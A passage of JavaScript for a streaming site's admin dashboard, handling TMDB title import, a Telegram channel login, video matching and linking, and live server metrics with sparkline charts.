      items.forEach(item => tmdbImportedIds.add(`${item.type}:${item.tmdb_id}`));
      tmdbSelected.clear();
      updateSelectedCount();
      renderTmdbResults();

      showToast(`Bulk import complete: ${data.imported} imported`, 'success');
      setTimeout(() => progressEl.classList.add('hidden'), 5000);
    } else {
      showToast(data.error || 'Bulk import failed', 'error');
      progressEl.classList.add('hidden');
    }
  } catch (e) {
    showToast('Bulk import failed: ' + e.message, 'error');
    progressEl.classList.add('hidden');
  }
}

// ═══════════════════════════════════════
//  Auto-Populate & Fix Missing Episodes
// ═══════════════════════════════════════

async function autoPopulate() {
  const btn = document.getElementById('autoPopulateBtn');
  const progressEl = document.getElementById('tmdbProgress');
  const fillEl = document.getElementById('tmdbProgressFill');
  const textEl = document.getElementById('tmdbProgressText');

  btn.disabled = true;
  btn.innerHTML = '<i class="ri-loader-4-line spin"></i> Importing...';
  progressEl.classList.remove('hidden');
  fillEl.style.width = '10%';
  textEl.textContent = 'Fetching Netflix content from TMDB (this may take 2-5 minutes)...';

  try {
    const res = await fetch(`${API_BASE}/api/tmdb/auto-populate`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'x-admin-password': adminPassword },
      body: JSON.stringify({ movies: 40, series: 20, pages: 3 }),
    });
    const data = await res.json();

    if (data.success) {
      fillEl.style.width = '100%';
      textEl.textContent = data.message;
      showToast(data.message, 'success');
      setTimeout(() => progressEl.classList.add('hidden'), 8000);
      // Refresh dashboard counts
      if (typeof loadDashboard === 'function') loadDashboard();
    } else {
      textEl.textContent = data.error || 'Auto-populate failed';
      showToast(data.error || 'Auto-populate failed', 'error');
      setTimeout(() => progressEl.classList.add('hidden'), 5000);
    }
  } catch (e) {
    textEl.textContent = 'Error: ' + e.message;
    showToast('Auto-populate failed: ' + e.message, 'error');
    setTimeout(() => progressEl.classList.add('hidden'), 5000);
  } finally {
    btn.disabled = false;
    btn.innerHTML = '<i class="ri-magic-line"></i> Auto-Populate Netflix Content';
  }
}

async function reimportEpisodes() {
  const btn = document.getElementById('reimportEpisodesBtn');
  const progressEl = document.getElementById('tmdbProgress');
  const fillEl = document.getElementById('tmdbProgressFill');
  const textEl = document.getElementById('tmdbProgressText');

  btn.disabled = true;
  btn.innerHTML = '<i class="ri-loader-4-line spin"></i> Fixing...';
  progressEl.classList.remove('hidden');
  fillEl.style.width = '20%';
  textEl.textContent = 'Re-importing missing episodes for all series...';

  try {
    const res = await fetch(`${API_BASE}/api/tmdb/reimport-episodes`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'x-admin-password': adminPassword },
    });
    const data = await res.json();

    if (data.success) {
      fillEl.style.width = '100%';
      textEl.textContent = data.message;
      showToast(data.message, 'success');
      setTimeout(() => progressEl.classList.add('hidden'), 5000);
    } else {
      textEl.textContent = data.error || 'Reimport failed';
      showToast(data.error || 'Reimport failed', 'error');
      setTimeout(() => progressEl.classList.add('hidden'), 5000);
    }
  } catch (e) {
    textEl.textContent = 'Error: ' + e.message;
    showToast('Reimport failed: ' + e.message, 'error');
    setTimeout(() => progressEl.classList.add('hidden'), 5000);
  } finally {
    btn.disabled = false;
    btn.innerHTML = '<i class="ri-refresh-line"></i> Fix Missing Episodes';
  }
}

// ════════════════════════════════════════════════════════════════
//  TELEGRAM CHANNEL INTEGRATION
// ════════════════════════════════════════════════════════════════

/** Check Telegram connection status and show/hide login */
async function tgCheckStatus() {
  try {
    const res = await fetch(`${API_BASE}/api/telegram/status`);
    const data = await res.json();
    const el = document.getElementById('tgStatus');
    const loginSection = document.getElementById('tgLoginSection');
    const connSection = document.getElementById('tgConnectedSection');
    const manualLink = document.getElementById('tgManualLinkSection');

    if (data.connected) {
      el.innerHTML = `<span class="ws-dot" style="background:#0f0"></span> Connected — ${data.channelTitle || data.channel}`;
      el.style.color = '#4caf50';
      if (loginSection) loginSection.style.display = 'none';
      if (connSection) connSection.style.display = 'block';
      if (manualLink) manualLink.style.display = 'block';
      tgLoadVideos();
    } else {
      el.innerHTML = `<span class="ws-dot" style="background:#f80"></span> Login Required`;
      el.style.color = '#ff9800';
      if (loginSection) loginSection.style.display = 'block';
      if (connSection) connSection.style.display = 'none';
      if (manualLink) manualLink.style.display = 'none';
    }
  } catch (e) {
    const el = document.getElementById('tgStatus');
    el.innerHTML = `<span class="ws-dot" style="background:#f44"></span> Error`;
    el.style.color = '#f44336';
  }
}

/** Step 1: Send OTP code to phone */
async function tgSendCode() {
  const phone = document.getElementById('tgPhone').value.trim();
  if (!phone) { showToast('Enter phone number with country code', 'error'); return; }

  const btn = document.getElementById('tgSendCodeBtn');
  const msgEl = document.getElementById('tgLoginMsg');
  btn.disabled = true;
  btn.innerHTML = '<i class="ri-loader-4-line spin"></i> Sending...';
  msgEl.style.display = 'block';
  msgEl.style.color = 'var(--muted)';
  msgEl.textContent = 'Sending code...';

  try {
    const res = await fetch(`${API_BASE}/api/telegram/send-code`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'x-admin-password': adminPassword },
      body: JSON.stringify({ phone }),
    });
    const data = await res.json();

    if (data.success) {
      document.getElementById('tgStep2').style.display = 'block';
      msgEl.style.color = '#4caf50';
      msgEl.textContent = '✓ Code sent! Check your Telegram app.';
      showToast('Code sent to Telegram', 'success');
    } else {
      msgEl.style.color = '#f44336';
      msgEl.textContent = '✗ ' + (data.error || 'Failed to send code');
      showToast(data.error || 'Failed', 'error');
    }
  } catch (e) {
    msgEl.style.color = '#f44336';
    msgEl.textContent = '✗ ' + e.message;
    showToast(e.message, 'error');
  } finally {
    btn.disabled = false;
    btn.innerHTML = '<i class="ri-send-plane-2-line"></i> Send Code';
  }
}

/** Step 2: Verify OTP code */
async function tgVerifyCode() {
  const code = document.getElementById('tgCode').value.trim();
  if (!code) { showToast('Enter the code', 'error'); return; }

  const btn = document.getElementById('tgVerifyBtn');
  const msgEl = document.getElementById('tgLoginMsg');
  btn.disabled = true;
  btn.innerHTML = '<i class="ri-loader-4-line spin"></i> Verifying...';

  try {
    const res = await fetch(`${API_BASE}/api/telegram/verify-code`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'x-admin-password': adminPassword },
      body: JSON.stringify({ code }),
    });
    const data = await res.json();

    if (data.success) {
      msgEl.style.color = '#4caf50';
      msgEl.textContent = '✓ Logged in! Loading channel videos...';
      showToast('Telegram connected!', 'success');
      setTimeout(() => tgCheckStatus(), 1000);
    } else if (data.needs2FA) {
      document.getElementById('tgStep3').style.display = 'block';
      msgEl.style.color = '#ff9800';
      msgEl.textContent = '⚠ Two-factor authentication required. Enter your 2FA password.';
      showToast('2FA required', 'info');
    } else {
      msgEl.style.color = '#f44336';
      msgEl.textContent = '✗ ' + (data.error || 'Invalid code');
      showToast(data.error || 'Invalid code', 'error');
    }
  } catch (e) {
    msgEl.style.color = '#f44336';
    msgEl.textContent = '✗ ' + e.message;
  } finally {
    btn.disabled = false;
    btn.innerHTML = '<i class="ri-check-line"></i> Verify';
  }
}

/** Step 3: Verify 2FA password */
async function tgVerify2FA() {
  const password = document.getElementById('tg2FA').value;
  if (!password) { showToast('Enter 2FA password', 'error'); return; }

  const msgEl = document.getElementById('tgLoginMsg');
  try {
    const res = await fetch(`${API_BASE}/api/telegram/verify-2fa`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'x-admin-password': adminPassword },
      body: JSON.stringify({ password }),
    });
    const data = await res.json();

    if (data.success) {
      msgEl.style.color = '#4caf50';
      msgEl.textContent = '✓ Logged in with 2FA!';
      showToast('Telegram connected!', 'success');
      setTimeout(() => tgCheckStatus(), 1000);
    } else {
      msgEl.style.color = '#f44336';
      msgEl.textContent = '✗ ' + (data.error || 'Wrong password');
    }
  } catch (e) {
    msgEl.style.color = '#f44336';
    msgEl.textContent = '✗ ' + e.message;
  }
}

/** Logout from Telegram */
async function tgLogout() {
  if (!confirm('Disconnect Telegram? You will need to login again.')) return;
  try {
    await fetch(`${API_BASE}/api/telegram/logout`, {
      method: 'POST',
      headers: { 'x-admin-password': adminPassword },
    });
    showToast('Logged out from Telegram', 'success');
    tgCheckStatus();
  } catch (e) {
    showToast('Logout error: ' + e.message, 'error');
  }
}

/** Scan channel and auto-match videos to TMDB entries */
async function tgScanChannel(force = false) {
  const progress = document.getElementById('tgScanProgress');
  const results = document.getElementById('tgScanResults');
  const textEl = document.getElementById('tgProgressText');
  progress.classList.remove('hidden');
  results.classList.add('hidden');
  textEl.textContent = force ? 'Force re-scanning Telegram channel...' : 'Scanning Telegram channel...';

  try {
    const forceParam = force ? '&force=true' : '';
    const res = await fetch(`${API_BASE}/api/telegram/scan?limit=200${forceParam}`, {
      method: 'POST',
      headers: { 'x-admin-password': adminPassword },
    });
    const data = await res.json();

    if (data.success) {
      document.getElementById('tgScanned').textContent = data.scanned;
      document.getElementById('tgMatched').textContent = data.matched;
      document.getElementById('tgUnmatched').textContent = data.unmatched;
      results.classList.remove('hidden');
      textEl.textContent = `Done! ${data.matched} matched, ${data.unmatched} unmatched out of ${data.scanned} videos`;

      // Show the videos list
      tgRenderVideos(data.results);
      showToast(`Scan complete: ${data.matched} auto-matched`, 'success');
    } else {
      textEl.textContent = 'Error: ' + (data.error || 'Unknown');
      showToast(data.error || 'Scan failed', 'error');
    }
  } catch (e) {
    textEl.textContent = 'Error: ' + e.message;
    showToast('Scan failed: ' + e.message, 'error');
  }

  setTimeout(() => progress.classList.add('hidden'), 4000);
}

/** Render telegram video scan results */
function tgRenderVideos(results) {
  const grid = document.getElementById('tgVideosList');
  if (!results || results.length === 0) {
    grid.innerHTML = '<p class="empty">No videos found in channel</p>';
    return;
  }

  grid.innerHTML = results.map(v => {
    const statusColor = v.status === 'matched' ? '#4caf50' : v.status === 'already_linked' ? '#2196f3' : '#ff9800';
    const statusIcon = v.status === 'matched' ? 'ri-check-line' : v.status === 'already_linked' ? 'ri-link' : 'ri-question-line';
    const statusText = v.status === 'matched' ? `Matched → ${esc(v.series || '')} ${esc(v.episode || '')}` :
                       v.status === 'already_linked' ? 'Already linked' :
                       `Unmatched${v.parsed ? ` (parsed: ${esc(v.parsed.showName || '?')} S${v.parsed.seasonNum || '?'}E${v.parsed.episodeNum || '?'})` : ''}`;

    return `
      <div class="vid-card" style="border-left:3px solid ${statusColor}">
        <div class="vid-info" style="padding:12px">
          <div class="vid-title" style="font-size:13px">${esc(v.fileName || 'No filename')}</div>
          <div class="vid-meta" style="font-size:11px;margin-top:4px">
            <span><i class="${statusIcon}" style="color:${statusColor}"></i> ${statusText}</span>
          </div>
          <div class="vid-meta" style="font-size:11px;margin-top:2px;color:var(--muted)">
            Message ID: <b>${v.messageId}</b>
          </div>
        </div>
      </div>`;
  }).join('');
}

/** Load channel video list (without scan/match) */
async function tgLoadVideos() {
  try {
    const res = await fetch(`${API_BASE}/api/telegram/videos?limit=50`, {
      headers: { 'x-admin-password': adminPassword },
    });
    const data = await res.json();
    if (data.success) {
      const grid = document.getElementById('tgVideosList');
      if (data.videos.length === 0) {
        grid.innerHTML = '<p class="empty">No videos in channel yet. Upload videos to @moviesfrer on Telegram.</p>';
        return;
      }
      grid.innerHTML = data.videos.map(v => {
        const sizeStr = v.fileSize > 1e9 ? (v.fileSize / 1e9).toFixed(1) + ' GB' :
                        v.fileSize > 1e6 ? (v.fileSize / 1e6).toFixed(0) + ' MB' : (v.fileSize / 1e3).toFixed(0) + ' KB';
        const durStr = v.duration > 0 ? Math.floor(v.duration / 60) + ':' + String(Math.floor(v.duration % 60)).padStart(2, '0') : '';
        const linked = v.linked ? `<span style="color:#4caf50"><i class="ri-link"></i> Linked to: ${esc(v.linked.title)}</span>` : '<span style="color:#ff9800">Not linked</span>';
        const typeTag = v.isVideo ? '<span style="color:#4caf50;font-weight:600">VIDEO</span>' : `<span style="color:#999">${esc(v.mimeType || 'file')}</span>`;

        return `
          <div class="vid-card" style="border-left:3px solid ${v.isVideo ? '#4caf50' : '#666'}">
            <div class="vid-info" style="padding:12px">
              <div class="vid-title" style="font-size:13px">${esc(v.fileName || v.caption || 'Untitled')}</div>
              <div class="vid-meta" style="font-size:11px;margin-top:4px">
                ${typeTag}
                ${v.resolution ? `<span>${v.resolution}</span>` : ''}
                ${durStr ? `<span>${durStr}</span>` : ''}
                <span>${sizeStr}</span>
                <span>ID: ${v.messageId}</span>
              </div>
              <div class="vid-meta" style="font-size:11px;margin-top:2px">${linked}</div>
              ${!v.isVideo ? '<div style="font-size:10px;color:#f44336;margin-top:4px">⚠ Not a playable video file</div>' : ''}
            </div>
          </div>`;
      }).join('');
    }
  } catch (e) {
    console.error('Telegram load error:', e);
  }
}

/** Manual link: associate a Telegram message with a video/episode entry */
async function tgLinkManual() {
  const messageId = parseInt(document.getElementById('tgLinkMsgId').value);
  const videoId = document.getElementById('tgLinkVideoId').value.trim();
  if (!messageId || !videoId) {
    showToast('Enter both Message ID and Video/Episode ID', 'error');
    return;
  }

  try {
    const res = await fetch(`${API_BASE}/api/telegram/link`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'x-admin-password': adminPassword },
      body: JSON.stringify({ messageId, videoId }),
    });
    const data = await res.json();
    if (data.success) {
      showToast(`Linked! ${data.video?.title || videoId} → Telegram msg ${messageId}`, 'success');
      document.getElementById('tgLinkMsgId').value = '';
      document.getElementById('tgLinkVideoId').value = '';
      tgLoadVideos();
    } else {
      showToast(data.error || 'Link failed', 'error');
    }
  } catch (e) {
    showToast('Link failed: ' + e.message, 'error');
  }
}

// Check status when Telegram page is opened
const origSwitchPage = typeof switchPage === 'function' ? switchPage : null;
(function patchSwitchPage() {
  const navLinks = document.querySelectorAll('.nav-link[data-page]');
  navLinks.forEach(link => {
    link.addEventListener('click', () => {
      if (link.dataset.page === 'telegram') {
        tgCheckStatus();
        tgLoadVideos();
      }
    });
  });
})();


// ═══════════════════════════════════════════════════════════
//  FORENSIC METRICS BAR — Real-time sparklines & monitoring
// ═══════════════════════════════════════════════════════════

const MetricsEngine = (() => {
  // Sparkline data buffers (last 40 data points)
  const SPARK_LEN = 40;
  const sparkData = {
    net: [],
    ws: [],
    ping: [],
  };
  const canvases = {};

  // Ping measurement
  let pingHistory = [];
  let pingInterval = null;
  let lastMetrics = null;

  function init() {
    // Create canvas elements inside spark containers
    ['sparkNet', 'sparkWs', 'sparkPing'].forEach(id => {
      const container = document.getElementById(id);
      if (!container) return;
      const canvas = document.createElement('canvas');
      canvas.width = 160;
      canvas.height = 14;
      container.appendChild(canvas);
      canvases[id] = canvas;
    });

    // Start ping loop
    pingInterval = setInterval(measurePing, 3000);
    measurePing();

    // Listen for server metrics via Socket.IO
    if (socket) {
      socket.on('server_metrics', handleMetrics);
    }
  }

  function formatBw(bytesPerSec) {
    if (bytesPerSec < 1024) return bytesPerSec + ' B/s';
    if (bytesPerSec < 1048576) return (bytesPerSec / 1024).toFixed(1) + ' KB/s';
    return (bytesPerSec / 1048576).toFixed(1) + ' MB/s';
  }

  function formatUptime(secs) {
    if (secs < 60) return secs + 's';
    if (secs < 3600) return Math.floor(secs / 60) + 'm ' + (secs % 60) + 's';
    const h = Math.floor(secs / 3600);
    const m = Math.floor((secs % 3600) / 60);
    if (h < 24) return h + 'h ' + m + 'm';
    const d = Math.floor(h / 24);
    return d + 'd ' + (h % 24) + 'h';
  }

  function handleMetrics(m) {
    lastMetrics = m;
    // Network
    setText('mNetReqSec', m.reqPerSec);
    setText('mNetBw', formatBw(m.bwPerSec));
    sparkData.net.push(m.reqPerSec);
    if (sparkData.net.length > SPARK_LEN) sparkData.net.shift();
    drawSparkline('sparkNet', sparkData.net, '#00e5ff');

    setState('metricNet', m.reqPerSec > 50 ? 'warn' : m.reqPerSec > 200 ? 'bad' : 'good');

    // WebSocket
    setText('mWsMsgSec', m.wsPerSec);
    setText('mWsClients', m.wsClients + ' clients');
    sparkData.ws.push(m.wsPerSec);
    if (sparkData.ws.length > SPARK_LEN) sparkData.ws.shift();
    drawSparkline('sparkWs', sparkData.ws, '#2979ff');

    setState('metricWs', m.wsClients === 0 ? 'warn' : 'good');

    // Server
    setText('mSrvUptime', formatUptime(m.uptime));
    setText('mSrvMem', m.memHeapMB + ' MB');
    const memPct = Math.min(100, Math.round((m.memHeapMB / Math.max(m.memRssMB, 128)) * 100));
    const memBar = document.getElementById('mSrvMemBar');
    if (memBar) memBar.style.width = memPct + '%';

    setState('metricSrv', m.memHeapMB > 400 ? 'bad' : m.memHeapMB > 200 ? 'warn' : 'good');

    // Streams
    setText('mStreams', m.activeStreams);
    setText('mDevices', m.devicesOnline + ' dev');

    // Errors
    setText('mErrors', m.errors);
    setState('metricErrors', m.errors > 100 ? 'bad' : m.errors > 10 ? 'warn' : 'good');
  }

  async function measurePing() {
    try {
      const t0 = performance.now();
      const res = await fetch(API_BASE + '/api/ping', { cache: 'no-store' });
      if (!res.ok) throw new Error();
      const t1 = performance.now();
      const ms = Math.round(t1 - t0);

      pingHistory.push(ms);
      if (pingHistory.length > SPARK_LEN) pingHistory.shift();

      setText('mPingMs', ms);
      const avg = Math.round(pingHistory.reduce((a, b) => a + b, 0) / pingHistory.length);
      setText('mPingStatus', 'avg ' + avg + 'ms');

      sparkData.ping.push(ms);
      if (sparkData.ping.length > SPARK_LEN) sparkData.ping.shift();
      drawSparkline('sparkPing', sparkData.ping, ms < 150 ? '#00e676' : ms < 400 ? '#ffab00' : '#ff1744');

      setState('metricPing', ms < 150 ? 'good' : ms < 400 ? 'warn' : 'bad');
    } catch (_) {
      setText('mPingMs', '—');
      setText('mPingStatus', 'offline');
      setState('metricPing', 'bad');
    }
  }

  function setText(id, val) {
    const el = document.getElementById(id);
    if (el) el.textContent = val;
  }

  function setState(id, state) {
    const el = document.getElementById(id);
    if (!el) return;
    el.classList.remove('state-good', 'state-warn', 'state-bad');
    el.classList.add('state-' + state);
  }

  function drawSparkline(containerId, data, color) {
    const canvas = canvases[containerId];
    if (!canvas || data.length < 2) return;
    const ctx = canvas.getContext('2d');
    const w = canvas.width;
    const h = canvas.height;
    ctx.clearRect(0, 0, w, h);

    const max = Math.max(...data, 1);
    const step = w / (SPARK_LEN - 1);

    // Fill
    ctx.beginPath();
    ctx.moveTo(0, h);
    data.forEach((v, i) => {
      const x = (i + SPARK_LEN - data.length) * step;
      const y = h - (v / max) * (h - 1);
      if (i === 0) ctx.lineTo(x, y);
      else ctx.lineTo(x, y);
    });
    ctx.lineTo((SPARK_LEN - 1) * step, h);
    ctx.closePath();
    ctx.fillStyle = color + '15'; // 8% opacity
    ctx.fill();

    // Line
    ctx.beginPath();
    data.forEach((v, i) => {
      const x = (i + SPARK_LEN - data.length) * step;
      const y = h - (v / max) * (h - 1);
      if (i === 0) ctx.moveTo(x, y);
      else ctx.lineTo(x, y);
    });
    ctx.strokeStyle = color;
    ctx.lineWidth = 1.2;
    ctx.stroke();
  }

  return { init, getLastMetrics: () => lastMetrics, getPingHistory: () => pingHistory, getSparkData: () => sparkData };
})();

// ═══ Metrics Detail Panel ═══
let activeDetailPanel = null;
let detailUpdateInterval = null;
const detailChartCanvases = {};

function openMetricsDetail(type) {
  const overlay = document.getElementById('metricsOverlay');
  const title = document.getElementById('mdpTitle');
  const body = document.getElementById('mdpBody');
  overlay.classList.remove('hidden');
  activeDetailPanel = type;

  const titles = {
    net: 'NETWORK DIAGNOSTICS',
    ws: 'WEBSOCKET INSPECTOR',
    ping: 'LATENCY ANALYSIS',
    srv: 'SERVER INTERNALS',
    streams: 'STREAM MONITOR',
    errors: 'ERROR TRACKER',
  };
  title.textContent = titles[type] || 'DIAGNOSTICS';
  updateDetailContent();
  if (detailUpdateInterval) clearInterval(detailUpdateInterval);
  detailUpdateInterval = setInterval(updateDetailContent, 2000);
}

function closeMetricsDetail() {
  document.getElementById('metricsOverlay').classList.add('hidden');
  activeDetailPanel = null;
  if (detailUpdateInterval) { clearInterval(detailUpdateInterval); detailUpdateInterval = null; }
}
document.getElementById('metricsOverlay')?.addEventListener('click', (e) => {
  if (e.target.id === 'metricsOverlay') closeMetricsDetail();
});

function updateDetailContent() {
  const m = MetricsEngine.getLastMetrics();
  const pings = MetricsEngine.getPingHistory();
  const sparks = MetricsEngine.getSparkData();
  if (!m) return;
  const body = document.getElementById('mdpBody');
  if (!body) return;

  const fmt = (bytes) => {
    if (bytes < 1024) return bytes + ' B';
    if (bytes < 1048576) return (bytes / 1024).toFixed(1) + ' KB';
    if (bytes < 1073741824) return (bytes / 1048576).toFixed(2) + ' MB';
    return (bytes / 1073741824).toFixed(2) + ' GB';
  };
  const fmtBw = (b) => {
    if (b < 1024) return b + ' B/s';
    if (b < 1048576) return (b / 1024).toFixed(1) + ' KB/s';
    return (b / 1048576).toFixed(1) + ' MB/s';
  };
  const fmtUp = (s) => {
    const d = Math.floor(s / 86400), h = Math.floor((s % 86400) / 3600), mn = Math.floor((s % 3600) / 60), sc = s % 60;
    return (d > 0 ? d + 'd ' : '') + (h > 0 ? h + 'h ' : '') + mn + 'm ' + sc + 's';
  };
  const health = (ok, warn, val) => `<span class="mdp-health ${val ? (ok ? 'ok' : (warn ? 'warn' : 'critical')) : 'ok'}"></span>`;

  let html = '';
  switch (activeDetailPanel) {
    case 'net':
      html = `
        <div class="mdp-section">THROUGHPUT</div>
        <div class="mdp-row"><span class="mdp-row-label">Requests / sec</span><span class="mdp-row-value accent">${m.reqPerSec}</span></div>
        <div class="mdp-row"><span class="mdp-row-label">Total Requests</span><span class="mdp-row-value">${m.reqTotal.toLocaleString()}</span></div>
        <div class="mdp-row"><span class="mdp-row-label">Bandwidth</span><span class="mdp-row-value accent">${fmtBw(m.bwPerSec)}</span></div>
        <div class="mdp-row"><span class="mdp-row-label">Total Transferred</span><span class="mdp-row-value">${fmt(m.bytesOut)}</span></div>
        <div class="mdp-section">HEALTH</div>
        <div class="mdp-row"><span class="mdp-row-label">Error Rate</span><span class="mdp-row-value ${m.errors > 100 ? 'red' : m.errors > 10 ? 'orange' : 'green'}">${health(m.errors < 10, m.errors < 100, true)}${m.errors} errors</span></div>
        <div class="mdp-row"><span class="mdp-row-label">Success %</span><span class="mdp-row-value green">${m.reqTotal > 0 ? ((1 - m.errors / m.reqTotal) * 100).toFixed(2) : '100.00'}%</span></div>
        <div class="mdp-chart-wrap"><span class="mdp-chart-label">REQ/S (60s)</span><canvas id="mdpChartNet" width="660" height="80"></canvas></div>
      `;
      break;
    case 'ws':
      html = `
        <div class="mdp-section">CONNECTIONS</div>
        <div class="mdp-row"><span class="mdp-row-label">Connected Clients</span><span class="mdp-row-value accent">${m.wsClients}</span></div>
        <div class="mdp-row"><span class="mdp-row-label">Messages / sec</span><span class="mdp-row-value accent">${m.wsPerSec}</span></div>
        <div class="mdp-section">MESSAGE FLOW</div>
        <div class="mdp-row"><span class="mdp-row-label">Messages In</span><span class="mdp-row-value">${m.wsIn.toLocaleString()}</span></div>
        <div class="mdp-row"><span class="mdp-row-label">Messages Out</span><span class="mdp-row-value">${m.wsOut.toLocaleString()}</span></div>
        <div class="mdp-row"><span class="mdp-row-label">Total Events</span><span class="mdp-row-value">${(m.wsIn + m.wsOut).toLocaleString()}</span></div>
        <div class="mdp-row"><span class="mdp-row-label">Status</span><span class="mdp-row-value green">${health(true, false, true)}${m.wsClients > 0 ? 'Active' : 'Idle'}</span></div>
        <div class="mdp-chart-wrap"><span class="mdp-chart-label">MSG/S (60s)</span><canvas id="mdpChartWs" width="660" height="80"></canvas></div>
      `;
      break;
    case 'ping':
      const avgPing = pings.length > 0 ? Math.round(pings.reduce((a, b) => a + b, 0) / pings.length) : 0;
      const minPing = pings.length > 0 ? Math.min(...pings) : 0;
      const maxPing = pings.length > 0 ? Math.max(...pings) : 0;
      const jitter = pings.length > 1 ? Math.round(pings.slice(-10).reduce((s, v, i, a) => i > 0 ? s + Math.abs(v - a[i - 1]) : 0, 0) / Math.max(pings.length - 1, 1)) : 0;
      const lastPing = pings.length > 0 ? pings[pings.length - 1] : 0;
      const pingState = lastPing < 150 ? 'green' : lastPing < 400 ? 'orange' : 'red';
      html = `
        <div class="mdp-section">ROUND-TRIP LATENCY</div>
        <div class="mdp-row"><span class="mdp-row-label">Current</span><span class="mdp-row-value ${pingState}">${lastPing} ms</span></div>
        <div class="mdp-row"><span class="mdp-row-label">Average</span><span class="mdp-row-value accent">${avgPing} ms</span></div>
        <div class="mdp-row"><span class="mdp-row-label">Min / Max</span><span class="mdp-row-value">${minPing} / ${maxPing} ms</span></div>
        <div class="mdp-row"><span class="mdp-row-label">Jitter</span><span class="mdp-row-value ${jitter > 50 ? 'orange' : 'green'}">${jitter} ms</span></div>
        <div class="mdp-row"><span class="mdp-row-label">Samples</span><span class="mdp-row-value">${pings.length}</span></div>
        <div class="mdp-row"><span class="mdp-row-label">Quality</span><span class="mdp-row-value ${pingState}">${health(lastPing < 150, lastPing < 400, true)}${lastPing < 150 ? 'Excellent' : lastPing < 400 ? 'Fair' : 'Poor'}</span></div>
        <div class="mdp-chart-wrap"><span class="mdp-chart-label">LATENCY (ms)</span><canvas id="mdpChartPing" width="660" height="80"></canvas></div>
      `;
      break;
    case 'srv':
      html = `
        <div class="mdp-section">RUNTIME</div>
        <div class="mdp-row"><span class="mdp-row-label">Uptime</span><span class="mdp-row-value accent">${fmtUp(m.uptime)}</span></div>
        <div class="mdp-row"><span class="mdp-row-label">Platform</span><span class="mdp-row-value">Node.js (Railway)</span></div>
        <div class="mdp-section">MEMORY</div>
        <div class="mdp-row"><span class="mdp-row-label">Heap Used</span><span class="mdp-row-value ${m.memHeapMB > 400 ? 'red' : m.memHeapMB > 200 ? 'orange' : 'green'}">${m.memHeapMB} MB</span></div>
        <div class="mdp-row"><span class="mdp-row-label">RSS</span><span class="mdp-row-value">${m.memRssMB} MB</span></div>
        <div class="mdp-row"><span class="mdp-row-label">Heap %</span><span class="mdp-row-value">${Math.round((m.memHeapMB / Math.max(m.memRssMB, 1)) * 100)}%</span></div>
        <div class="mdp-section">I/O</div>
        <div class="mdp-row"><span class="mdp-row-label">Active Streams</span><span class="mdp-row-value accent">${m.activeStreams}</span></div>
        <div class="mdp-row"><span class="mdp-row-label">Devices Online</span><span class="mdp-row-value green">${m.devicesOnline}</span></div>
        <div class="mdp-row"><span class="mdp-row-label">WS Clients</span><span class="mdp-row-value">${m.wsClients}</span></div>
      `;
      break;
    case 'streams':
      html = `
        <div class="mdp-section">ACTIVE STREAMS</div>
        <div class="mdp-row"><span class="mdp-row-label">Current</span><span class="mdp-row-value accent">${m.activeStreams}</span></div>
        <div class="mdp-row"><span class="mdp-row-label">Source</span><span class="mdp-row-value">Telegram MTProto</span></div>
        <div class="mdp-section">CONNECTED DEVICES</div>
        <div class="mdp-row"><span class="mdp-row-label">Online</span><span class="mdp-row-value green">${m.devicesOnline}</span></div>
        <div class="mdp-row"><span class="mdp-row-label">WS Clients</span><span class="mdp-row-value">${m.wsClients}</span></div>
        <div class="mdp-section">BANDWIDTH</div>
        <div class="mdp-row"><span class="mdp-row-label">Current</span><span class="mdp-row-value accent">${fmtBw(m.bwPerSec)}</span></div>
        <div class="mdp-row"><span class="mdp-row-label">Total Out</span><span class="mdp-row-value">${fmt(m.bytesOut)}</span></div>
      `;
      break;
    case 'errors':
      const errRate = m.reqTotal > 0 ? (m.errors / m.reqTotal * 100).toFixed(3) : '0.000';
      html = `
        <div class="mdp-section">ERROR SUMMARY</div>
        <div class="mdp-row"><span class="mdp-row-label">Total Errors</span><span class="mdp-row-value ${m.errors > 100 ? 'red' : m.errors > 10 ? 'orange' : 'green'}">${m.errors}</span></div>
        <div class="mdp-row"><span class="mdp-row-label">Error Rate</span><span class="mdp-row-value">${errRate}%</span></div>
        <div class="mdp-row"><span class="mdp-row-label">Success Rate</span><span class="mdp-row-value green">${(100 - parseFloat(errRate)).toFixed(3)}%</span></div>
        <div class="mdp-row"><span class="mdp-row-label">Total Requests</span><span class="mdp-row-value">${m.reqTotal.toLocaleString()}</span></div>
        <div class="mdp-section">SYSTEM STATUS</div>
        <div class="mdp-row"><span class="mdp-row-label">Server</span><span class="mdp-row-value green">${health(true, false, true)}Online</span></div>
        <div class="mdp-row"><span class="mdp-row-label">Database</span><span class="mdp-row-value green">${health(true, false, true)}Connected</span></div>
        <div class="mdp-row"><span class="mdp-row-label">Telegram</span><span class="mdp-row-value green">${health(true, false, true)}Session Active</span></div>
      `;
      break;
  }
  body.innerHTML = html;

  // Draw detail charts
  setTimeout(() => {
    const chartMap = { net: { id: 'mdpChartNet', data: sparks.net, color: '#00e5ff' }, ws: { id: 'mdpChartWs', data: sparks.ws, color: '#2979ff' }, ping: { id: 'mdpChartPing', data: sparks.ping, color: pings.length && pings[pings.length - 1] < 150 ? '#00e676' : '#ffab00' } };
    const cfg = chartMap[activeDetailPanel];
    if (cfg) drawDetailChart(cfg.id, cfg.data, cfg.color);
  }, 50);
}

function drawDetailChart(canvasId, data, color) {
  const canvas = document.getElementById(canvasId);
  if (!canvas || data.length < 2) return;
  const ctx = canvas.getContext('2d');
  const w = canvas.width, h = canvas.height;
  ctx.clearRect(0, 0, w, h);

  // Grid lines
  ctx.strokeStyle = 'rgba(255,255,255,.04)';
  ctx.lineWidth = 1;
  for (let i = 0; i < 4; i++) {
    const y = (h / 4) * i;
    ctx.beginPath(); ctx.moveTo(0, y); ctx.lineTo(w, y); ctx.stroke();
  }

  const max = Math.max(...data, 1);
  const step = w / (data.length - 1);

  // Gradient fill
  const grad = ctx.createLinearGradient(0, 0, 0, h);
  grad.addColorStop(0, color + '30');
  grad.addColorStop(1, color + '05');
  ctx.beginPath();
  ctx.moveTo(0, h);
  data.forEach((v, i) => ctx.lineTo(i * step, h - (v / max) * (h - 4)));
  ctx.lineTo((data.length - 1) * step, h);
  ctx.closePath();
  ctx.fillStyle = grad;
  ctx.fill();

  // Line
